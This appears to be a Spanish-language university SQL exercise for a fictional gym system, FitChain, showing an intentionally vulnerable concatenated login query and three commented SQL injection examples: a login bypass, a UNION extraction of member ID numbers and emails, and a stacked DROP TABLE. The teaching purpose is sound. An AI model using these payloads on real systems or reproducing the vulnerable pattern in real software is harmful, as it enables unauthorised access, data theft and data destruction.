-- ============================================================
-- TP5 - Sistema de Gestión FitChain
-- Parte D.2.a - SQL Injection
-- Comisión 3K03
--
-- La tabla SOCIO no posee columna de contraseña (la autenticación
-- de la app es un aspecto separado de los datos personales). Para
-- este ejercicio se agrega la tabla CREDENCIAL_ACCESO, tal como
-- correspondería en una implementación real del login de FitChain.
-- ============================================================

CREATE TABLE CREDENCIAL_ACCESO (
    idSocio      INT PRIMARY KEY REFERENCES SOCIO(idSocio),
    email        VARCHAR(50) UNIQUE NOT NULL,
    passwordHash VARCHAR(255) NOT NULL
);


-- ============================================================
-- CÓDIGO VULNERABLE (pseudocódigo de la app)
-- Formulario de login construido por concatenación directa de
-- strings, sin sanitización:
-- ============================================================
-- query = "SELECT * FROM CREDENCIAL_ACCESO WHERE email='" + input_email
--         + "' AND passwordHash='" + input_pass + "'"


-- ============================================================
-- ATAQUE 1 - Login bypass
-- ============================================================
-- El carácter ' cierra anticipadamente el literal de cadena, y los
-- guiones -- comentan el resto de la consulta (incluida la
-- validación de contraseña). El motor devuelve el registro del
-- usuario admin sin verificar la clave, otorgando acceso ilícito.

SELECT * FROM CREDENCIAL_ACCESO
WHERE email='admin@fitchain.com' --' AND passwordHash='nohacefalta';


-- ============================================================
-- ATAQUE 2 - Exfiltración de datos
-- ============================================================
-- Como la primera parte no devuelve filas (email='inexistente'), el
-- operador UNION adjunta los resultados de una segunda consulta que
-- expone datos confidenciales de la tabla SOCIO (DNI, email),
-- violando la dimensión de confidencialidad.

SELECT * FROM CREDENCIAL_ACCESO
WHERE email='inexistente' UNION SELECT idSocio, dni, email FROM SOCIO --' AND passwordHash='y';


-- ============================================================
-- ATAQUE 3 - Destrucción
-- ============================================================
-- El carácter ; actúa como separador de sentencias, permitiendo
-- inyectar comandos DDL destructivos que eliminan tablas
-- operacionales del sistema, comprometiendo la disponibilidad
-- del negocio.

SELECT * FROM CREDENCIAL_ACCESO
WHERE email='x'; DROP TABLE FACTURA; --' AND passwordHash='y';
